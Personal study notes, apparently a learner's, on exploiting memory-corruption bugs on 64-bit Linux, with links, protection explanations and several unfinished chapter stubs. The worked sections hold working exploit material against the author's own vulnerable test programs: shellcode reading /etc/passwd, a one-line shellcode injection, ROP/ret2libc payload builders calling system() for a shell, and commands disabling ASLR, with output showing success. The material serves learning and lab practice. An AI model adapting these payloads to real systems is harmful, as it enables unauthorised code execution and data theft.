   
Why ? 
I was disappointed by  most tutorials on memory attacks as they are only on 32bits. I want to look into exploiting simple vulnerabilities on modern 64 bits Windows / Linux OS such as  stack overflow, heap overflow and so on. 




Raw copy paste notes: 

stack is growing downward and buffer is filled upward  =) 
int 0x80 = syscall 
pagesize is 1kB 
if you only have printf linked in plt then you can still use system in libc , just know the offset 
compiler for the libraries change the offsets 
function pointer overwrite = code exec 
there is one ROP in 64b  libc for system bin/sh , there is a system /bin/sh
there is one ROP in 32b  libc for system bin/sh , there is a system /bin/sh
you need to bypass RELRO  (for ARM exploit) 





Chapters 

Intro : generic tools and info 


    >>>>> Chapter 1 Linux x64 <<<<<< 


Part 1 Stack overflows userland
1 Stack overflow without NX , ASLR, Canaries 
2 Stack overflow with NX , without ASLR and Canaries
3 Stack overflow with NX, ASLR , Canaries 
4 Stack overflow with full protection (PIE) 



Part 2 Specific Bugs exploits userland 
0 Write what where , 4 bytes  , 
1 One byte overwrite , with NX, ASLR , Canaries 
2 Format strings 



Part 3 Heap overflows  userland 
1 heapoverflow house of force / top chunk rewrite,  without ASLR ?  
2 heapoverflow house of mind  




    >>>>>> Chapter 2 : Windows x64  <<<<<<<



Part 1 Windows Kernel exploits 
https://github.com/hacksysteam/HackSysExtremeVulnerableDriver


Part 2 Stackoverflow userland 




    >>>>>> Chapter 3: ARM <<<<<<


Part 1 Stack 
1 Stack overflow with NX , ASLR , Canaries 

Part 2 : Bugs 


Part 3 : Heap 




>>>>>>> Chapter 3 : x86 oldschool (for reference)  <<<<<< 

Part 1 

Part 2 




Appendix Knowledge Base 

Stack 
https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/
https://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/

All 
http://www.opensecuritytraining.info/Exploits1_files/SoftwareExploits_public.pdf   best 32 bits training 
http://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/

C  / C++ pointers 
http://boredzo.org/pointers/
The unary or monadic operator & gives the "address of a variable''.
The indirection or dereference operator * gives the "contents of an object pointed to by this pointer'".

LD Linker 
https://docs.oracle.com/cd/E19683-01/817-1983/6mhm6r4es/
https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html

ASLR 
https://securityetalii.es/2013/02/03/how-effective-is-aslr-on-linux-systems/


INTRO 



what is what ? 

Canary
Stack canaries work by modifying every function's prologue and epilogue regions to place and check a value on the stack respectively. As such, if a stack buffer is overwritten during a memory copy operation, the error is noticed before execution returns from the copy function. When this happens, an exception is raised, which is passed back up the exception handler hierarchy until it finally hits the OS's default exception handler. If you can overwrite an existing exception handler structure in the stack, you can make it point to your own code. This is a Structured Exception Handling (SEH) exploit, and it allows you to completely skip the canary check.
DEP / NX
DEP and NX essentially mark important structures in memory as non-executable, and force hardware-level exceptions if you try to execute those memory regions. This makes normal stack buffer overflows where you set eip to esp+offset and immediately run your shellcode impossible, because the stack is non-executable. Bypassing DEP and NX requires a cool trick called Return-Oriented Programming.
ROP essentially involves finding existing snippets of code from the program (called gadgets) and jumping to them, such that you produce a desired outcome. Since the code is part of legitimate executable memory, DEP and NX don't matter. These gadgets are chained together via the stack, which contains your exploit payload. Each entry in the stack corresponds to the address of the next ROP gadget. Each gadget is in the form of instr1; instr2; instr3; ... instrN; ret, so that the ret will jump to the next address on the stack after executing the instructions, thus chaining the gadgets together. Often additional values have to be placed on the stack in order to successfully complete a chain, due to instructions that would otherwise get in the way.
The trick is to chain these ROPs together in order to call a memory protection function such as VirtualProtect, which is then used to make the stack executable, so your shellcode can run, via an jmp esp or equivalent gadget. Tools like mona.py can be used to generate these ROP gadget chains, or find ROP gadgets in general.
ASLR
There are a few ways to bypass ASLR:

    Direct RET overwrite - Often processes with ASLR will still load non-ASLR modules, allowing you to just run your shellcode via a jmp esp.

    Partial EIP overwrite - Only overwrite part of EIP, or use a reliable information disclosure in the stack to find what the real EIP should be, then use it to calculate your target. We still need a non-ASLR module for this though.

    NOP spray - Create a big block of NOPs to increase chance of jump landing on legit memory. Difficult, but possible even when all modules are ASLR-enabled. Won't work if DEP is switched on though.

    Bruteforce - If you can try an exploit with a vulnerability that doesn't make the program crash, you can bruteforce 256 different target addresses until it works.



RELRO  
RELRO stands for Relocation Read-Only, meaning that the headers in your binary, which need to be writable during startup of the application (to allow the dynamic linker to load and link stuff like shared libraries) are marked as read-only when the linker is done doing its magic (but before the application itself is launched). The difference between Partial RELRO and Full RELRO is that the Global Offset Table (and Procedure Linkage Table) which act as kind-of process-specific lookup tables for symbols (names that need to point to locations elsewhere in the application or even in loaded shared libraries) are marked read-only too in the Full RELRO. Downside of this is that lazy binding (only resolving those symbols the first time you hit them, making applications start a bit faster) is not possible anymore.


PIE 
to do 


ASLR 0 1 2 
see ref 


The debugger 
Starting with GDB version 7, first appearing in Ubuntu with Karmic (Ubuntu 9.10), ASLR is turned off (via the ADDR_NO_RANDOMIZE personality flag) for the debugged process.  If you want a more realistic view of how a process will appear in memory, you must “set disable-randomization off” in gdb:    
Stack is not randomize in GDB while its randomised in OS   T.T 
If you pop a shell you need to attach to fork with set follow-fork-mode child , so you can confirm you poped a shell , system("id") is easier =) 
https://outflux.net/blog/archives/2010/07/03/gdb-turns-off-aslr/

sending bytes to gdb , use "set args" 
gdb ./program 
then gdb set args `perl -e 'printf "\xef\qqqxbe\xad\xde"') AAAA BBBB`


Hardening  
https://wiki.debian.org/Hardening


Analyzing a binary 

low@glyph:~/r2$ ./rabin2 -iI /home/low/research/babynxaslr/stack
[Imports]
ordinal=001 plt=0x00400410 bind=GLOBAL type=FUNC name=strcpy
ordinal=002 plt=0x00400420 bind=GLOBAL type=FUNC name=system
ordinal=003 plt=0x00400430 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=004 plt=0x00400440 bind=UNKNOWN type=NOTYPE name=__gmon_start__

4 imports
havecode true
pic      false
canary   false
nx       true
crypto   false
va       true
intrp    /lib64/ld-linux-x86-64.so.2
bintype  elf
class    ELF64
lang     c
arch     x86
bits     64
machine  AMD x86-64 architecture
os       linux
minopsz  1
maxopsz  16
pcalign  0
subsys   linux
endian   little
stripped false
static   false
linenum  true
lsyms    true
relocs   true
rpath    NONE
binsz    4957

or gdb-peda: checksec is faster 


The compiler 
low@glyph:~/research/babynxaslr$ gcc -V
gcc: error: unrecognized command line option ‘-V’
gcc: fatal error: no input files
compilation terminated.
low@glyph:~/research/babynxaslr$ gcc -v
Using built-in specs.
COLLECT_GCC=gcc
COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/5/lto-wrapper
Target: x86_64-linux-gnu
Configured with: ../src/configure -v --with-pkgversion='Debian 5.4.0-6' --with-bugurl=file:///usr/share/doc/gcc-5/README.Bugs --enable-languages=c,ada,c++,java,go,d,fortran,objc,obj-c++ --prefix=/usr --program-suffix=-5 --enable-shared --enable-linker-build-id --libexecdir=/usr/lib --without-included-gettext --enable-threads=posix --libdir=/usr/lib --enable-nls --with-sysroot=/ --enable-clocale=gnu --enable-libstdcxx-debug --enable-libstdcxx-time=yes --with-default-libstdcxx-abi=new --enable-gnu-unique-object --disable-vtable-verify --enable-libmpx --enable-plugin --with-system-zlib --disable-browser-plugin --enable-java-awt=gtk --enable-gtk-cairo --with-java-home=/usr/lib/jvm/java-1.5.0-gcj-5-amd64/jre --enable-java-home --with-jvm-root-dir=/usr/lib/jvm/java-1.5.0-gcj-5-amd64 --with-jvm-jar-dir=/usr/lib/jvm-exports/java-1.5.0-gcj-5-amd64 --with-arch-directory=amd64 --with-ecj-jar=/usr/share/java/eclipse-ecj.jar --enable-objc-gc --enable-multiarch --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --enable-multilib --with-tune=generic --enable-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu
Thread model: posix
gcc version 5.4.0 20160609 (Debian 5.4.0-6) 


build PIE PIC for ASLR ON , at least the binary code 0x00000000004***** randomization   
(gcc/g++ -fPIE -pie)


The environement stack address 

tool : 
cat getenv.c 
#include <stdio.h>
#include <string.h>

int main (int argc, char *argv[])
{
   printf("Address is : %016x \n " , getenv(argv[1])); 


   return(0);
} 



The shellcode test and 64bits issues 
                                         
            file hello.asm:


NB .data section (where your code ends up) is not executable by default. Also, you should make sure your code is position independent.           
 
 
    global _start
    _start:
    jmp short string

    code:
    pop rsi
    xor rax, rax
    mov al, 1
    mov rdi, rax
    mov rdx, rdi
    add rdx, 14
    syscall

    xor rax, rax
    add rax, 60
    xor rdi, rdi
    syscall

    string:
    call code
    db  'Hello, world!',0x0A
$ nasm -felf64 hello.asm -o hello.o
$ ld -s -o hello hello.o
$ for i in $(objdump -d hello |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo
\xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89\xc7\x48\x89\xfa\x48\x83\xc2\x0e\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a
char code[] = "\xeb\x1e\x5e\x48\x31\xc0\xb0\x01\x48\x89\xc7\x4\x89\xfa  \x48\x83\xc2\x0e\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05\xe8\xdd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21\x0a";

int main(int argc, char **argv)
{
    int (*func)();
    func = (int (*)()) code;
    (int)(*func)();
     return 0;
}
$ gcc -z execstack -o code code.c    
$./code
Hello, world!
    
Linux renders the BSS block EXECUTABLE with -z execstack , crazy right ? BSD does not 



Defaults 
ASLR : 2 is enabled by defaut (gdb is not randomized) 
Stack canary is not enabled by default when using gcc 
NX is enabled 



CHAPTER 1 : x64 , 64 bits baby 


PART 1 

---------------------------- 1. : the bof 

Stack overflow on 64 bits without ASLR and canaries and NX 

ASLR OFF / Canaries OFF / NX OFF


Program code
root@k2:~/research/babynxaslr# cat bof.c 
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
int main(int argc, char **argv) {
char buffer[256];
if(argc != 2) 
{ exit(0); } 
printf("%p\n", buffer);
strcpy(buffer,  argv[1]);
printf("%s\n", buffer);
return 0;
}
Knowing the offset to overwrite return address 
root@k2:~/research/babynxaslr# cat offset.bof 
(gdb) p 0x7fffffffe198-0x7fffffffe090
$4 = 264
the start of buffer is : 
0x7fffffffe0b0



Shellcode
in assembly 
shellcode.asm 
BITS 64
; Author Mr.Un1k0d3r 
; Read /etc/passwd Linux x86_64 Shellcode
; Shellcode size 82 bytes
global _start
section .text
_start:
jmp _push_filename
_readfile:
; syscall open file
pop rdi 
; pop path value
; NULL byte fix
xor byte [rdi + 11], 0x41
xor rax, rax
add al, 2
xor rsi, rsi
; set O_RDONLY flag
syscall
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff 
; size to read
xor rax, rax
syscall
; syscall write to stdout
xor rdi, rdi
add dil, 1      ; set stdout fd = 1
mov rdx, rax
xor rax, rax
add al, 1
syscall
; syscall exit
xor rax, rax
add al, 60
syscall
_push_filename:
call _readfile
path: db "/etc/passwd"Compile it 
in bytecode 
nasm -f elf64 shellcode.asm -o readfile.o
Dump hex bytecode 
>> objdump -d readfile.o | grep "^ " | cut -f2 
for i in $(objdump -d readfile.o | grep "^ " | cut -f2); do echo -n '\x'$i; done 


Exploit
root@k2:~/research/babynxaslr# cat bofASLR.method 
./bof $(python -c 'print "\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" + "A"*177 + "\x7f\xff\xff\xff\xe0\xb0"[::-1]')


Disable protections to test
root@k2:~/research/babynxaslr# cat disableASLR.sh 
bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
root@k2:~/research/babynxaslr# cat disablecanaries.method 
gcc overflow.c -o overflow -fno-stack-protector
 


DONE /rootdance 

still need to know why NX is disabled by default ? 


------------------------  2. : the classico 

ASLR OFF / Canaries OFF (default) / NX ON 




Program code 

cat ret2libc.c 
/* Compile: gcc -fno-stack-protector ret2libc.c -o ret2libc      */ -fnostackprotector is default and useless here 
/* Disable ASLR: echo 0 > /proc/sys/kernel/randomize_va_space     */

#include <stdio.h>
#include <unistd.h>

int vuln() {
    char buf[80];
    int r;
    r = read(0, buf, 400);
    printf("\nRead %d bytes. buf is %s\n", r, buf);
    puts("No shell for you :(");
    return 0;
}

int main(int argc, char *argv[]) {
    printf("Try to exec /bin/sh");
    vuln();
    return 0;
}


Knowing the offset 

cat classic.method 
low@glyph:~/gits/exploit-pattern$ python pattern.py Ad2Ad3Ad
Pattern Ad2Ad3Ad first occurrence at position 96 in pattern.

In fact it was RBP value so you need to add 8 bytes to control RIP (1 PO) 
 

Building the exploit 


gdb-peda : b main 
run 
p system 
find "id" 


Finding a ROP to poping a value from the stack into RDI (argument of system call) 

low@glyph:~/gits/Ropper$ python Ropper.py --file /home/low/research/babynxaslr/theclassic/ret2libc --search "% ?di"
[INFO] Load gadgets from cache
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: % ?di

[INFO] File: /home/low/research/babynxaslr/theclassic/ret2libc
0x00000000004004c8: add byte ptr [rax], al; test rax, rax; je 0x4e0; pop rbp; mov edi, 0x600a48; jmp rax; 
0x0000000000400516: add byte ptr [rax], al; test rax, rax; je 0x528; pop rbp; mov edi, 0x600a48; jmp rax; 
0x00000000004004cd: je 0x4e0; pop rbp; mov edi, 0x600a48; jmp rax; 
0x000000000040051b: je 0x528; pop rbp; mov edi, 0x600a48; jmp rax; 
0x00000000004004d0: mov edi, 0x600a48; jmp rax; 
0x00000000004004cf: pop rbp; mov edi, 0x600a48; jmp rax; 
0x0000000000400653: pop rdi; ret; 
0x00000000004004cb: test eax, eax; je 0x4e0; pop rbp; mov edi, 0x600a48; jmp rax; 
0x0000000000400519: test eax, eax; je 0x528; pop rbp; mov edi, 0x600a48; jmp rax; 
0x00000000004004ca: test rax, rax; je 0x4e0; pop rbp; mov edi, 0x600a48; jmp rax; 
0x0000000000400518: test rax, rax; je 0x528; pop rbp; mov edi, 0x600a48; jmp rax; 



Building the payload 
cat constructexploit.py 
#!/usr/bin/env python

from struct import *

buf = ""
buf += "A"*104                              # junk
buf += pack("<Q", 0x400653)       # pop rdi; ret;
buf += pack("<Q", 0x7ffff7a4902e)                 # pointer to string "id" in libc gets popped into rdi
buf += pack("<Q", 0x00007ffff7a77540)           # address of system()

f = open("in.txt", "w")
f.write(buf)






Disable ASLR 
root@glyph:/home/low/research/babynxaslr# bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

 low@glyph:~/research/babynxaslr/theclassic$ ./getenv HOME
Address is : 00000000ffffedc7 
 low@glyph:~/research/babynxaslr/theclassic$ ./getenv HOME
Address is : 00000000ffffedc7 

low@glyph:~/research/babynxaslr/theclassic$ ./ret2libc < in.txt
Try to exec /bin/sh
Read 128 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
No shell for you :(
uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(netdev),113(bluetooth),114(scanner)


DONE  /rootdance 






----------------------------------- 3. : the stack 
        
    
Stack overflow on 64bits with ASLR and canaries : 
ASLR ON (Partial, not PIE)/ Canaries ON / NX ON / PIE OFF 

NO PIE , so no relocation of the binary, always loaded at same address 0x00000400000 

Set GDB aslr ON 

Ok its exactly the same as above except you dont use library address =D easy ?  





    Program code 

low@glyph:~/research/babynxaslr/thestack$ cat stack2.c
#include <string.h>
#include <stdio.h>
#include <unistd.h>

int main (int argc, char **argv){

char buf [1024];
int r;
int z; 

z = 2; 
r = read(0, buf, 2048);
printf("\nRead %d bytes. buf is %s\n", r, buf);
puts("Bypass ASLR godamn bitch id; suck love it;");

if(z<1) { 

system("/bin/false");

}

}



Knowing the offset 

python pattern offset, 
break at the last RET before the SEGFAULT or crach , get the $RSP which will be pop and feed it to python 
offset is at 1048 



Building the exploit 


Find the gadget which pops a value from the stack (atacker value) into rdi  ( python Ropper.py --file stack2 --search ) 
Find the address of a string interesting to pass to system call (ie peda : find "id;" ) 
Find the address of the system inside 



low@glyph:~/research/babynxaslr/thestack$ cat constructexploit2.py 
#!/usr/bin/env python

import sys 
from struct import *

buf = ""
buf += "A" * 1048                           # junk offset to stack overflow
buf += pack("<Q", 0x00000000004006b3)       # pop rdi; ret;
buf += pack("<Q", 0x0000000000400711)       # pointer to "/bin/sh" in the binary  , gets popped into rdi
buf += pack("<Q", 0x0000000000400480)       # address of system()

f = open("in2.txt", "w")
f.write(buf)


Exploiting 

low@glyph:~/research/babynxaslr/thestack$ ./stack2 < in2.txt 

Read 1072 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0
Bypass ASLR godamn bitch id; suck love it;
uid=1000(low) gid=1000(low) groups=1000(low),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(netdev),113(bluetooth),114(scanner)
sh: 1: suck: not found  (its due to the garbage in the rest of the string) 
Segmentation fault



Chapter X : The monster 

Full ASLR (PIE code) 

http://cybersecurity.upv.es/attacks/offset2lib/offset2lib.html



Part 2 : BUGS exploits 

BUGS !  bugs everywhere 



----------- 1. One byte write is enough  ! 

Almost FULL PROTECTION =D 
ASLR ON / Canaries ON / NX ON / PIE OFF 
    


Program code 





----------------------- 


Part 3 : Heap overflows 
Lets go into hard mode 




---------------------- A0. Arbitrary write exploit , arbiter , arbwrite 


Protection OFF except NX and ASLR 
ASLR gets in our way as we dont know there the shellcode will be put (Stack ASLR) 
Only RELRO can protect the following exploit (Read only of GOT  / .Dtors ) 




Program code 

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h> 


void main(int argc, char **argv)

{
        unsigned int *ptr1 = *((unsigned int *)(argv[1]));
        unsigned int *ptr2 = *((unsigned int *)(argv[2]));
        printf("ptr = 0x%x\n" , ptr1);
        printf("ptr2 = 0x%x\n", ptr2);
        printf("argv[3] at = 0x%x\n", &(argv[3]));
        *ptr1 = ptr2;
        printf("papa legba, hear my call!!!\n");
        exit(0);
}



I want to rewrite .got.plt or .fini_array but they are full of bad chars (0x0a and 0x20 fuck) 

Its a difficult exploit exercise, you can write only 4 bytes of memory , to 8 bytes address , the stack is not executable 

Return address into libc ? 














